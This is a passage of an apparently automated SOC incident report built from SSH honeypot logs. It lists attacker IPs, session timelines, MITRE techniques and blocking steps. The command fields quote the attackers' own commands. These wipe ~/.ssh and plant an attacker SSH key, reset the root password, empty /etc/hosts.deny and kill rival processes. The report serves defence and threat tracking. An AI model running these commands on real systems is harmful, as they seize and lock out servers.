| `2026-04-13 07:38:23` | `cowrie.command.input` |
| `2026-04-13 07:38:23` | `cowrie.log.closed` |
| `2026-04-13 07:38:23` | `cowrie.session.params` |
| `2026-04-13 07:38:23` | `cowrie.command.input` |
| `2026-04-13 07:38:24` | `cowrie.log.closed` |
| `2026-04-13 07:38:25` | `cowrie.session.params` |
| `2026-04-13 07:38:25` | `cowrie.command.input` |
| `2026-04-13 07:38:25` | `cowrie.log.closed` |
| `2026-04-13 07:38:26` | `cowrie.session.params` |
| `2026-04-13 07:38:26` | `cowrie.command.input` |
| `2026-04-13 07:38:26` | `cowrie.log.closed` |
| `2026-04-13 07:38:27` | `cowrie.session.params` |
| `2026-04-13 07:38:27` | `cowrie.command.input` |
| `2026-04-13 07:38:28` | `cowrie.log.closed` |
| `2026-04-13 07:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.98[.]88` to AbuseIPDB if not already reported
- [ ] Block `180.76.98[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c523a8107af3

| Field | Detail |
|---|---|
| **Source IP** | `180.76.98[.]88` |
| **First Seen** | 2026-04-13 07:45 |
| **Last Seen** | 2026-04-13 07:45 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 07:45:00` | `cowrie.session.connect` |
| `2026-04-13 07:45:00` | `cowrie.client.version` |
| `2026-04-13 07:45:00` | `cowrie.client.kex` |
| `2026-04-13 07:45:02` | `cowrie.login.success` |
| `2026-04-13 07:45:03` | `cowrie.session.params` |
| `2026-04-13 07:45:03` | `cowrie.command.input` |
| `2026-04-13 07:45:03` | `cowrie.command.failed` |
| `2026-04-13 07:45:03` | `cowrie.log.closed` |
| `2026-04-13 07:45:05` | `cowrie.session.params` |
| `2026-04-13 07:45:05` | `cowrie.command.input` |
| `2026-04-13 07:45:11` | `cowrie.session.file_download` |
| `2026-04-13 07:45:11` | `cowrie.log.closed` |
| `2026-04-13 07:45:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.98[.]88` to AbuseIPDB if not already reported
- [ ] Block `180.76.98[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d3ffda08afa

| Field | Detail |
|---|---|
| **Source IP** | `180.76.98[.]88` |
| **First Seen** | 2026-04-13 07:45 |
| **Last Seen** | 2026-04-13 07:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 07:45:20` | `cowrie.session.connect` |
| `2026-04-13 07:45:20` | `cowrie.client.version` |
| `2026-04-13 07:45:22` | `cowrie.client.kex` |
| `2026-04-13 07:45:24` | `cowrie.login.success` |
| `2026-04-13 07:45:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.98[.]88` to AbuseIPDB if not already reported
- [ ] Block `180.76.98[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e2cd817ad15

| Field | Detail |
|---|---|
| **Source IP** | `180.76.98[.]88` |
| **First Seen** | 2026-04-13 07:45 |
| **Last Seen** | 2026-04-13 07:47 |
| **Session Duration** | 90s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;, cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 07:45:53` | `cowrie.session.connect` |
| `2026-04-13 07:45:53` | `cowrie.client.version` |
| `2026-04-13 07:45:53` | `cowrie.client.kex` |
| `2026-04-13 07:45:55` | `cowrie.login.success` |
| `2026-04-13 07:45:58` | `cowrie.session.params` |
| `2026-04-13 07:45:58` | `cowrie.command.input` |
| `2026-04-13 07:45:58` | `cowrie.command.failed` |
| `2026-04-13 07:45:58` | `cowrie.log.closed` |
| `2026-04-13 07:45:58` | `cowrie.session.params` |
| `2026-04-13 07:45:58` | `cowrie.command.input` |
| `2026-04-13 07:45:59` | `cowrie.session.file_download` |
| `2026-04-13 07:45:59` | `cowrie.log.closed` |
| `2026-04-13 07:46:11` | `cowrie.session.params` |
| `2026-04-13 07:46:11` | `cowrie.command.input` |
| `2026-04-13 07:46:11` | `cowrie.log.closed` |
| `2026-04-13 07:46:19` | `cowrie.session.params` |
| `2026-04-13 07:46:19` | `cowrie.command.input` |
| `2026-04-13 07:46:20` | `cowrie.session.file_download` |
| `2026-04-13 07:46:20` | `cowrie.log.closed` |
| `2026-04-13 07:46:21` | `cowrie.session.params` |
| `2026-04-13 07:46:21` | `cowrie.command.input` |
| `2026-04-13 07:46:21` | `cowrie.log.closed` |
| `2026-04-13 07:46:22` | `cowrie.session.params` |
| `2026-04-13 07:46:22` | `cowrie.command.input` |
| `2026-04-13 07:46:24` | `cowrie.log.closed` |
| `2026-04-13 07:46:25` | `cowrie.session.params` |
| `2026-04-13 07:46:25` | `cowrie.command.input` |
| `2026-04-13 07:46:25` | `cowrie.command.input` |
| `2026-04-13 07:46:25` | `cowrie.log.closed` |
| `2026-04-13 07:46:33` | `cowrie.session.params` |
| `2026-04-13 07:46:33` | `cowrie.command.input` |
| `2026-04-13 07:46:39` | `cowrie.log.closed` |
| `2026-04-13 07:47:23` | `cowrie.session.params` |
| `2026-04-13 07:47:23` | `cowrie.command.input` |
| `2026-04-13 07:47:23` | `cowrie.log.closed` |
| `2026-04-13 07:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.98[.]88` to AbuseIPDB if not already reported
- [ ] Block `180.76.98[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d81965af9d7

| Field | Detail |
|---|---|
| **Source IP** | `124.163.255[.]210` |
| **First Seen** | 2026-04-13 07:48 |
| **Last Seen** | 2026-04-13 07:48 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:apDmJEUr3X34"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 07:48:17` | `cowrie.session.connect` |
| `2026-04-13 07:48:17` | `cowrie.client.version` |
| `2026-04-13 07:48:18` | `cowrie.client.kex` |
| `2026-04-13 07:48:18` | `cowrie.login.success` |
| `2026-04-13 07:48:19` | `cowrie.session.params` |
| `2026-04-13 07:48:19` | `cowrie.command.input` |
| `2026-04-13 07:48:19` | `cowrie.command.failed` |
| `2026-04-13 07:48:19` | `cowrie.log.closed` |
| `2026-04-13 07:48:19` | `cowrie.session.params` |
| `2026-04-13 07:48:19` | `cowrie.command.input` |
| `2026-04-13 07:48:19` | `cowrie.session.file_download` |
| `2026-04-13 07:48:19` | `cowrie.log.closed` |
| `2026-04-13 07:48:33` | `cowrie.session.params` |
| `2026-04-13 07:48:33` | `cowrie.command.input` |
| `2026-04-13 07:48:33` | `cowrie.log.closed` |
| `2026-04-13 07:48:33` | `cowrie.session.params` |
| `2026-04-13 07:48:33` | `cowrie.command.input` |
| `2026-04-13 07:48:33` | `cowrie.log.closed` |
| `2026-04-13 07:48:33` | `cowrie.session.params` |
| `2026-04-13 07:48:33` | `cowrie.command.input` |
| `2026-04-13 07:48:34` | `cowrie.session.file_download` |
| `2026-04-13 07:48:34` | `cowrie.log.closed` |
| `2026-04-13 07:48:34` | `cowrie.session.params` |
| `2026-04-13 07:48:34` | `cowrie.command.input` |
| `2026-04-13 07:48:34` | `cowrie.log.closed` |
| `2026-04-13 07:48:34` | `cowrie.session.params` |
| `2026-04-13 07:48:34` | `cowrie.command.input` |
| `2026-04-13 07:48:35` | `cowrie.log.closed` |
| `2026-04-13 07:48:35` | `cowrie.session.params` |
| `2026-04-13 07:48:35` | `cowrie.command.input` |
| `2026-04-13 07:48:35` | `cowrie.command.input` |
| `2026-04-13 07:48:35` | `cowrie.log.closed` |
| `2026-04-13 07:48:35` | `cowrie.session.params` |
| `2026-04-13 07:48:35` | `cowrie.command.input` |
| `2026-04-13 07:48:36` | `cowrie.log.closed` |
| `2026-04-13 07:48:36` | `cowrie.session.params` |
| `2026-04-13 07:48:36` | `cowrie.command.input` |
| `2026-04-13 07:48:36` | `cowrie.log.closed` |
| `2026-04-13 07:48:36` | `cowrie.session.params` |
| `2026-04-13 07:48:36` | `cowrie.command.input` |
| `2026-04-13 07:48:37` | `cowrie.log.closed` |
| `2026-04-13 07:48:37` | `cowrie.session.params` |
| `2026-04-13 07:48:37` | `cowrie.command.input` |
| `2026-04-13 07:48:37` | `cowrie.log.closed` |
| `2026-04-13 07:48:37` | `cowrie.session.params` |
| `2026-04-13 07:48:37` | `cowrie.command.input` |
| `2026-04-13 07:48:37` | `cowrie.log.closed` |
| `2026-04-13 07:48:38` | `cowrie.session.params` |
| `2026-04-13 07:48:38` | `cowrie.command.input` |
| `2026-04-13 07:48:38` | `cowrie.log.closed` |
| `2026-04-13 07:48:38` | `cowrie.session.params` |
| `2026-04-13 07:48:38` | `cowrie.command.input` |
| `2026-04-13 07:48:38` | `cowrie.log.closed` |
| `2026-04-13 07:48:39` | `cowrie.session.params` |
| `2026-04-13 07:48:39` | `cowrie.command.input` |
| `2026-04-13 07:48:39` | `cowrie.log.closed` |
| `2026-04-13 07:48:39` | `cowrie.session.params` |
| `2026-04-13 07:48:39` | `cowrie.command.input` |
| `2026-04-13 07:48:39` | `cowrie.log.closed` |
| `2026-04-13 07:48:40` | `cowrie.session.params` |
| `2026-04-13 07:48:40` | `cowrie.command.input` |
| `2026-04-13 07:48:40` | `cowrie.log.closed` |
| `2026-04-13 07:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.163.255[.]210` to AbuseIPDB if not already reported
- [ ] Block `124.163.255[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea62a814c5f

| Field | Detail |
|---|---|
| **Source IP** | `124.163.255[.]210` |
| **First Seen** | 2026-04-13 07:57 |
| **Last Seen** | 2026-04-13 07:57 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:hZGpqxYLSHCF"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 07:57:34` | `cowrie.session.connect` |
| `2026-04-13 07:57:34` | `cowrie.client.version` |
| `2026-04-13 07:57:34` | `cowrie.client.kex` |
| `2026-04-13 07:57:34` | `cowrie.login.success` |
| `2026-04-13 07:57:35` | `cowrie.session.params` |
| `2026-04-13 07:57:35` | `cowrie.command.input` |
| `2026-04-13 07:57:35` | `cowrie.command.failed` |
| `2026-04-13 07:57:35` | `cowrie.log.closed` |
| `2026-04-13 07:57:35` | `cowrie.session.params` |
| `2026-04-13 07:57:35` | `cowrie.command.input` |
| `2026-04-13 07:57:35` | `cowrie.session.file_download` |
| `2026-04-13 07:57:35` | `cowrie.log.closed` |
| `2026-04-13 07:57:49` | `cowrie.session.params` |
| `2026-04-13 07:57:49` | `cowrie.command.input` |
| `2026-04-13 07:57:49` | `cowrie.log.closed` |
| `2026-04-13 07:57:49` | `cowrie.session.params` |
| `2026-04-13 07:57:49` | `cowrie.command.input` |
| `2026-04-13 07:57:49` | `cowrie.log.closed` |
| `2026-04-13 07:57:50` | `cowrie.session.params` |
| `2026-04-13 07:57:50` | `cowrie.command.input` |
| `2026-04-13 07:57:50` | `cowrie.session.file_download` |
| `2026-04-13 07:57:50` | `cowrie.log.closed` |
| `2026-04-13 07:57:50` | `cowrie.session.params` |
| `2026-04-13 07:57:50` | `cowrie.command.input` |
| `2026-04-13 07:57:50` | `cowrie.log.closed` |
| `2026-04-13 07:57:51` | `cowrie.session.params` |
| `2026-04-13 07:57:51` | `cowrie.command.input` |
| `2026-04-13 07:57:51` | `cowrie.log.closed` |
| `2026-04-13 07:57:51` | `cowrie.session.params` |
| `2026-04-13 07:57:51` | `cowrie.command.input` |
| `2026-04-13 07:57:51` | `cowrie.command.input` |
| `2026-04-13 07:57:51` | `cowrie.log.closed` |
| `2026-04-13 07:57:52` | `cowrie.session.params` |
| `2026-04-13 07:57:52` | `cowrie.command.input` |
| `2026-04-13 07:57:52` | `cowrie.log.closed` |
| `2026-04-13 07:57:52` | `cowrie.session.params` |
| `2026-04-13 07:57:52` | `cowrie.command.input` |
| `2026-04-13 07:57:52` | `cowrie.log.closed` |
| `2026-04-13 07:57:53` | `cowrie.session.params` |
| `2026-04-13 07:57:53` | `cowrie.command.input` |
| `2026-04-13 07:57:53` | `cowrie.log.closed` |
| `2026-04-13 07:57:53` | `cowrie.session.params` |
| `2026-04-13 07:57:53` | `cowrie.command.input` |
| `2026-04-13 07:57:53` | `cowrie.log.closed` |
| `2026-04-13 07:57:54` | `cowrie.session.params` |
| `2026-04-13 07:57:54` | `cowrie.command.input` |
| `2026-04-13 07:57:54` | `cowrie.log.closed` |
| `2026-04-13 07:57:54` | `cowrie.session.params` |
| `2026-04-13 07:57:54` | `cowrie.command.input` |
| `2026-04-13 07:57:54` | `cowrie.log.closed` |
| `2026-04-13 07:57:55` | `cowrie.session.params` |
| `2026-04-13 07:57:55` | `cowrie.command.input` |
| `2026-04-13 07:57:55` | `cowrie.log.closed` |
| `2026-04-13 07:57:55` | `cowrie.session.params` |
| `2026-04-13 07:57:55` | `cowrie.command.input` |
| `2026-04-13 07:57:55` | `cowrie.log.closed` |
| `2026-04-13 07:57:56` | `cowrie.session.params` |
| `2026-04-13 07:57:56` | `cowrie.command.input` |
| `2026-04-13 07:57:56` | `cowrie.log.closed` |
| `2026-04-13 07:57:56` | `cowrie.session.params` |
| `2026-04-13 07:57:56` | `cowrie.command.input` |
| `2026-04-13 07:57:56` | `cowrie.log.closed` |
| `2026-04-13 07:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.163.255[.]210` to AbuseIPDB if not already reported
- [ ] Block `124.163.255[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b94014368c2

| Field | Detail |
|---|---|
| **Source IP** | `124.163.255[.]210` |
| **First Seen** | 2026-04-13 07:59 |
| **Last Seen** | 2026-04-13 07:59 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:5xZgVE40ygSs"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 07:59:21` | `cowrie.session.connect` |
| `2026-04-13 07:59:21` | `cowrie.client.version` |
| `2026-04-13 07:59:21` | `cowrie.client.kex` |
| `2026-04-13 07:59:22` | `cowrie.login.success` |
| `2026-04-13 07:59:22` | `cowrie.session.params` |
| `2026-04-13 07:59:22` | `cowrie.command.input` |
| `2026-04-13 07:59:22` | `cowrie.command.failed` |
| `2026-04-13 07:59:22` | `cowrie.log.closed` |
| `2026-04-13 07:59:22` | `cowrie.session.params` |
| `2026-04-13 07:59:22` | `cowrie.command.input` |
| `2026-04-13 07:59:23` | `cowrie.session.file_download` |
| `2026-04-13 07:59:23` | `cowrie.log.closed` |
| `2026-04-13 07:59:36` | `cowrie.session.params` |
| `2026-04-13 07:59:36` | `cowrie.command.input` |
| `2026-04-13 07:59:36` | `cowrie.log.closed` |
| `2026-04-13 07:59:37` | `cowrie.session.params` |
| `2026-04-13 07:59:37` | `cowrie.command.input` |
| `2026-04-13 07:59:37` | `cowrie.log.closed` |
| `2026-04-13 07:59:37` | `cowrie.session.params` |
| `2026-04-13 07:59:37` | `cowrie.command.input` |
| `2026-04-13 07:59:37` | `cowrie.session.file_download` |
| `2026-04-13 07:59:37` | `cowrie.log.closed` |
| `2026-04-13 07:59:38` | `cowrie.session.params` |
| `2026-04-13 07:59:38` | `cowrie.command.input` |
| `2026-04-13 07:59:38` | `cowrie.log.closed` |
| `2026-04-13 07:59:38` | `cowrie.session.params` |
| `2026-04-13 07:59:38` | `cowrie.command.input` |
| `2026-04-13 07:59:38` | `cowrie.log.closed` |
| `2026-04-13 07:59:39` | `cowrie.session.params` |
| `2026-04-13 07:59:39` | `cowrie.command.input` |
| `2026-04-13 07:59:39` | `cowrie.command.input` |
| `2026-04-13 07:59:39` | `cowrie.log.closed` |
| `2026-04-13 07:59:39` | `cowrie.session.params` |
| `2026-04-13 07:59:39` | `cowrie.command.input` |
| `2026-04-13 07:59:39` | `cowrie.log.closed` |
| `2026-04-13 07:59:39` | `cowrie.session.params` |
| `2026-04-13 07:59:39` | `cowrie.command.input` |
| `2026-04-13 07:59:40` | `cowrie.log.closed` |
| `2026-04-13 07:59:40` | `cowrie.session.params` |
| `2026-04-13 07:59:40` | `cowrie.command.input` |
| `2026-04-13 07:59:40` | `cowrie.log.closed` |
| `2026-04-13 07:59:40` | `cowrie.session.params` |
| `2026-04-13 07:59:40` | `cowrie.command.input` |
| `2026-04-13 07:59:41` | `cowrie.log.closed` |
| `2026-04-13 07:59:41` | `cowrie.session.params` |
| `2026-04-13 07:59:41` | `cowrie.command.input` |
| `2026-04-13 07:59:41` | `cowrie.log.closed` |
| `2026-04-13 07:59:41` | `cowrie.session.params` |
| `2026-04-13 07:59:41` | `cowrie.command.input` |
| `2026-04-13 07:59:42` | `cowrie.log.closed` |
| `2026-04-13 07:59:42` | `cowrie.session.params` |
| `2026-04-13 07:59:42` | `cowrie.command.input` |
| `2026-04-13 07:59:42` | `cowrie.log.closed` |
| `2026-04-13 07:59:42` | `cowrie.session.params` |
| `2026-04-13 07:59:42` | `cowrie.command.input` |
| `2026-04-13 07:59:43` | `cowrie.log.closed` |
| `2026-04-13 07:59:43` | `cowrie.session.params` |
| `2026-04-13 07:59:43` | `cowrie.command.input` |
| `2026-04-13 07:59:43` | `cowrie.log.closed` |
| `2026-04-13 07:59:43` | `cowrie.session.params` |
| `2026-04-13 07:59:43` | `cowrie.command.input` |
| `2026-04-13 07:59:44` | `cowrie.log.closed` |
| `2026-04-13 07:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.163.255[.]210` to AbuseIPDB if not already reported
- [ ] Block `124.163.255[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0427710d571d

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:25 |
| **Last Seen** | 2026-04-13 09:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:25:11` | `cowrie.session.connect` |
| `2026-04-13 09:25:11` | `cowrie.client.version` |
| `2026-04-13 09:25:11` | `cowrie.client.kex` |
| `2026-04-13 09:25:12` | `cowrie.login.success` |
| `2026-04-13 09:25:12` | `cowrie.session.params` |
| `2026-04-13 09:25:12` | `cowrie.command.input` |
| `2026-04-13 09:25:12` | `cowrie.command.failed` |
| `2026-04-13 09:25:13` | `cowrie.log.closed` |
| `2026-04-13 09:25:13` | `cowrie.session.params` |
| `2026-04-13 09:25:13` | `cowrie.command.input` |
| `2026-04-13 09:25:13` | `cowrie.session.file_download` |
| `2026-04-13 09:25:13` | `cowrie.log.closed` |
| `2026-04-13 09:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b530377b5e1

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:25 |
| **Last Seen** | 2026-04-13 09:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
